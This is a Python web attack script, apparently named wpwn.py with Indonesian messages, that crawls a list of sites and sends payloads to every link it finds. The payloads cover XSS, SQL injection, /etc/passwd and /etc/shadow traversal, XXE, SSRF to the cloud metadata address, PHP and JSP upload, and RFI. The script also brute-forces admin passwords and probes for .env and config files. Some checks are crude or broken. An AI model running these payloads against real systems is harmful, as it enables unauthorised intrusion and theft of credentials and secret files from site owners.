import requests
import sys
import time
import threading
from bs4 import BeautifulSoup

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    return [url.strip() for url in urls if url.strip()]

def crawl(url):
    print(f"\n[!] Mencrawl URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            links = set()
            for a_tag in soup.find_all('a', href=True):
                link = a_tag['href']
                if link.startswith('/'):
                    link = url + link
                elif not link.startswith('http'):
                    continue
                links.add(link)
            print(f"[*] Ditemukan {len(links)} tautan di {url}.")
            return links
        else:
            print(f"[!] Gagal mengakses {url} - Status code: {response.status_code}")
            return set()
    except requests.exceptions.RequestException as e:
        print(f"[!] Error saat mencrawl {url}: {e}")
        return set()

def save_results_to_html(filename, results):
    with open(filename, 'w') as f:
        f.write("<html><head><title>Hasil Pengujian Kerentanan</title></head><body>")
        f.write("<h1>Hasil Pengujian Kerentanan</h1>")
        f.write("<table border='1'><tr><th>URL</th><th>Kerentanan</th><th>Request</th><th>Response</th></tr>")
        
        for url, vulnerabilities in results.items():
            for vulnerability in vulnerabilities['details']:
                f.write(f"<tr><td>{url}</td><td>{vulnerability['type']}</td><td><pre>{vulnerability['request']}</pre></td><td><pre>{vulnerability['response']}</pre></td></tr>")
        
        f.write("</table></body></html>")
    print(f"[*] Hasil disimpan ke {filename}")

def checkwaf(url):
    try:
        sc = requests.get(url, timeout=5)
        if sc.status_code != 200:
            print("[!] Error with status code:", sc.status_code)
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error checking WAF for {url}: {e}")
        return False

    noise = "?=<script>alert()</script>"
    fuzz = url + noise

    try:
        waffd = requests.get(fuzz, timeout=5)
        if waffd.status_code in [406, 501, 999, 419, 403]:
            print("[\033[1;31m!\033[0;0m] WAF Detected.")
            return True
        else:
            print("[*] No WAF Detected.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error checking WAF response for {url}: {e}")
        return False

def banner(url):
    try:
        sc = requests.get(url, timeout=5)
        if sc.status_code != 200:
            print("[!] Error with status code:", sc.status_code)
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching banner for {url}: {e}")
        return False

    print(f"\nBanner for {url}: {sc.headers.get('Server', 'N/A')}")
    return True

def header(url):
    try:
        h = requests.get(url, timeout=5)
        he = h.headers
        print("Server:", he.get('server', 'N/A'))
        print("Data:", he.get('date', 'N/A'))
        print("Powered:", he.get('x-powered-by', 'N/A'))
        print("\n")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching headers for {url}: {e}")
        return False

def xss_(url):
    paydone = []
    payloads = ['<script>alert("XSS")</script>', '"<img src=x onerror=alert(1)>']
    print("[!] Testing XSS")

    for pl in payloads:
        try:
            req = requests.get(url + '?param=' + pl, timeout=5)
            if pl in req.text:
                paydone.append(pl)
                print("[*] Vulnerable to XSS with payload:", pl)
        except requests.exceptions.RequestException as e:
            print(f"[!] XSS test failed for payload {pl}: {e}")
    
    return paydone

def sql_(url):
    print("\n[!] Testing SQL Injection")
    payload = "' OR '1'='1"
    try:
        req = requests.get(url + '?param=' + payload, timeout=5)
        if "mysql_fetch_array()" in req.text or "You have an error in your SQL syntax" in req.text:
            print("[*] Vulnerable to SQL Injection!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] SQL Injection test failed: {e}")
    return False

def lfi_injection(url):
    print("\n[!] Testing Local File Inclusion (LFI)")
    payloads = ['../etc/passwd', '../../etc/passwd']
    
    for payload in payloads:
        try:
            req = requests.get(url + '?file=' + payload, timeout=5)
            if "root:x:0:0" in req.text:
                print(f"[*] Vulnerable to LFI with payload: {payload}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] LFI test failed for payload {payload}: {e}")
    
    return False

def xst_(url):
    print("\n[!] Testing Cross Site Tracing (XST)")
    headers = {"Test": "Hello_Word", "User-Agent": "Mozilla/5.0"}
    try:
        req = requests.get(url, headers=headers, timeout=5)
        if "Hello_Word" in req.text:
            print("[*] Vulnerable to Cross Site Tracing (XST)!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] XST test failed for {url}: {e}")

    return False

def crlf_injection(url):
    print("\n[!] Testing CRLF Injection")
    payload = "%0D%0AInjected-Header: test"
    try:
        req = requests.get(url + payload, timeout=5)
        if "Injected-Header: test" in req.text:
            print("[*] Vulnerable to CRLF Injection!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] CRLF Injection test failed for {url}: {e}")

    return False

def upload_injection(url):
    print("\n[!] Testing File Upload Vulnerability")
    payloads = [
        ("malicious.php", "<?php echo 'Hacked!'; ?>"),
        ("malicious.jsp", "<% out.println('Hacked!'); %>")
    ]

    for filename, content in payloads:
        files = {'file': (filename, content)}
        try:
            req = requests.post(url, files=files, timeout=5)
            if "Hacked!" in req.text:
                print(f"[*] Vulnerable to file upload with {filename}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] File upload test failed for {filename}: {e}")

def xxe_injection(url):
    print("\n[!] Testing XML External Entity (XXE) Injection")
    payload = '''<?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>'''
    
    headers = {'Content-Type': 'application/xml'}
    try:
        req = requests.post(url, data=payload, headers=headers, timeout=5)
        if "root:x:0:0" in req.text:
            print("[*] Vulnerable to XXE Injection!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] XXE Injection test failed for {url}: {e}")

    return False

def path_traversal(url):
    print("\n[!] Testing Path Traversal")
    payloads = ['../../etc/passwd', '../../../../etc/shadow']
    
    for payload in payloads:
        try:
            req = requests.get(url + '?file=' + payload, timeout=5)
            if "root:x:0:0" in req.text:
                print(f"[*] Vulnerable to Path Traversal with payload: {payload}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Path Traversal test failed for payload {payload}: {e}")

    return False

def ssrf_injection(url):
    print("\n[!] Menguji SSRF Injection")

    payloads = [
        'http://localhost',
        'http://127.0.0.1',
        'http://169.254.169.254/latest/meta-data/',
        'http://example.com'
    ]

    for payload in payloads:
        try:
            test_url = url + '?url=' + payload
            req = requests.get(test_url, timeout=5)
            if req.status_code == 200:
                print(f"[*] SSRF berhasil dengan payload: {payload}!")
                return True
            else:
                print(f"[!] SSRF gagal untuk payload: {payload}. Status code: {req.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Uji SSRF gagal untuk payload {payload}: {e}")

    return False

def brute_force(url, username, password_list):
    print("\n[!] Menguji Brute Force")
    for password in password_list:
        try:
            data = {'username': username, 'password': password}
            req = requests.post(url, data=data, timeout=5)
            if "Login successful" in req.text:  # Ganti dengan respons yang sesuai
                print(f"[*] Brute force berhasil! Username: {username}, Password: {password}")
                return True
            else:
                print(f"[!] Gagal dengan password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Uji Brute Force gagal untuk password {password}: {e}")

    return False

def rfi_injection(url):
    print("\n[!] Menguji Remote File Inclusion (RFI)")
    
    payload = "http://example.com/malicious.txt"  # Ganti dengan URL file yang ingin diuji

    try:
        req = requests.get(url + '?file=' + payload, timeout=5)
        if "malicious content" in req.text:  # Ganti dengan konten yang diharapkan dari file yang disertakan
            print(f"[*] RFI berhasil dengan payload: {payload}!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Uji RFI gagal untuk payload {payload}: {e}")

    return False

def security_misconfiguration(url):
    print("\n[!] Menguji Security Misconfiguration")
    
    security_headers = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Content-Security-Policy',
        'Strict-Transport-Security'
    ]

    try:
        req = requests.get(url, timeout=5)
        headers = req.headers

        for header in security_headers:
            if header not in headers:
                print(f"[!] Header keamanan hilang: {header}")
            else:
                print(f"[*] Header keamanan ditemukan: {header}")

        sensitive_files = [
            '/config.php',
            '/.env',
            '/web.config',
            '/app/config/config.php'
        ]

        for file in sensitive_files:
            test_url = url + file
            resp = requests.get(test_url, timeout=5)
            if resp.status_code == 200:
                print(f"[!] File sensitif dapat diakses: {test_url}")
            else:
                print(f"[*] File sensitif tidak dapat diakses: {test_url} (Status code: {resp.status_code})")

    except requests.exceptions.RequestException as e:
        print(f"[!] Uji Security Misconfiguration gagal: {e}")

def rpo_attack(url):
    print("\n[!] Menguji RPO Attack")

    payload = {
        "method": "maliciousMethod",
        "params": ["maliciousParam"],
        "id": 1
    }

    try:
        req = requests.post(url, json=payload, timeout=5)
        if req.status_code == 200:
            print("[*] RPO Attack berhasil! Respons:", req.json())
            return True
        else:
            print(f"[!] RPO Attack gagal. Status code: {req.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Uji RPO Attack gagal: {e}")

    return False

def race_condition(url):
    print("\n[!] Menguji Race Condition")

    def send_request():
        try:
            req = requests.get(url, timeout=5)
            print(f"[+] Respons dari {url}: {req.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Permintaan gagal: {e}")

    threads = []
    for _ in range(10):  # Mengatur jumlah permintaan yang ingin dikirim
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("[*] Pengujian Race Condition selesai.")

# Kode utama
try:
    arvs = sys.argv
    file_path = arvs[1]  # Mengambil argumen pertama setelah nama skrip
except IndexError:
    print("Penggunaan: python3 wpwn.py <file_path>")
    sys.exit(1)

urls = read_urls_from_file(file_path)

# Menggunakan crawler untuk mendapatkan semua tautan dari halaman
all_urls = set()

for url in urls:
    if 'http' not in url:
        continue
    crawled_links = crawl(url)
    all_urls.update(crawled_links)

# Mengambil nama file dari file_path untuk menyimpan hasil
filename = file_path.split('/')[-1].replace('.txt', '') + "_results.html"

# Mengumpulkan hasil kerentanan
results = {}

# Contoh penggunaan fungsi brute-force
username = "admin"  # Ganti dengan username yang ingin diuji
password_list = ["password123", "123456", "admin", "letmein"]  # Ganti dengan daftar password yang ingin diuji

for url in all_urls:
    vulnerabilities = {'details': []}
    timing1 = time.time()
    
    if checkwaf(url):
        vulnerabilities['details'].append({"type": "WAF Detected", "request": "", "response": ""})
    if banner(url):
        vulnerabilities['details'].append({"type": "Banner Found", "request": "", "response": ""})
    if header(url):
        vulnerabilities['details'].append({"type": "Headers Checked", "request": "", "response": ""})
    
    # Menguji kerentanan lainnya
    xss_results = xss_(url)
    for pl in xss_results:
        vulnerabilities['details'].append({"type": "XSS Vulnerability Detected", "request": f'GET {url}?param={pl}', "response": "Response containing XSS payload"})
    
    if sql_(url):
        vulnerabilities['details'].append({"type": "SQL Injection Detected", "request": f'GET {url}?param=%27+OR+%271%27=%271', "response": "Response indicating SQL error"})
    
    if lfi_injection(url):
        vulnerabilities['details'].append({"type": "LFI Vulnerability Detected", "request": f'GET {url}?file=../etc/passwd', "response": "Response containing /etc/passwd content"})
    
    if xst_(url):
        vulnerabilities['details'].append({"type": "XST Vulnerability Detected", "request": f'GET {url}', "response": "Response containing XST payload"})
    
    if crlf_injection(url):
        vulnerabilities['details'].append({"type": "CRLF Injection Detected", "request": f'GET {url}%0D%0AInjected-Header: test', "response": "Response indicating CRLF injection"})
    
    if upload_injection(url):
        vulnerabilities['details'].append({"type": "File Upload Vulnerability Detected", "request": f'POST {url} with malicious file', "response": "Response indicating upload success"})
    
    if xxe_injection(url):
        vulnerabilities['details'].append({"type": "XXE Vulnerability Detected", "request": "POST with XML payload", "response": "Response containing /etc/passwd content"})
    
    if path_traversal(url):
        vulnerabilities['details'].append({"type": "Path Traversal Detected", "request": f'GET {url}?file=../../etc/passwd', "response": "Response containing /etc/passwd content"})
    
    if ssrf_injection(url):
        vulnerabilities['details'].append({"type": "SSRF Vulnerability Detected", "request": f'GET {url}?url=http://localhost', "response": "Response from localhost"})
    
    if brute_force(url, username, password_list):
        vulnerabilities['details'].append({"type": "Brute Force Vulnerability Detected", "request": f'POST {url} with username and password', "response": "Response indicating login success"})
    
    if rfi_injection(url):
        vulnerabilities['details'].append({"type": "RFI Vulnerability Detected", "request": f'GET {url}?file=http://example.com/malicious.txt', "response": "Response indicating RFI success"})
    
    if security_misconfiguration(url):
        vulnerabilities['details'].append({"type": "Security Misconfiguration Detected", "request": f'GET {url}', "response": "Response with missing security headers"})
    
    if rpo_attack(url):
        vulnerabilities['details'].append({"type": "RPO Attack Detected", "request": "POST with malicious method", "response": "Response indicating RPO success"})
    
    if race_condition(url):
        vulnerabilities['details'].append({"type": "Race Condition Detected", "request":f'GET {url}', "response": "Response from multiple threads"})

    if vulnerabilities['details']:
        results[url] = vulnerabilities
    
    timing2 = time.time()
    timet = timing2 - timing1
    print("\n[!] Waktu yang digunakan:", int(timet), "detik.\n")

# Menyimpan hasil ke file HTML
save_results_to_html(filename, results)

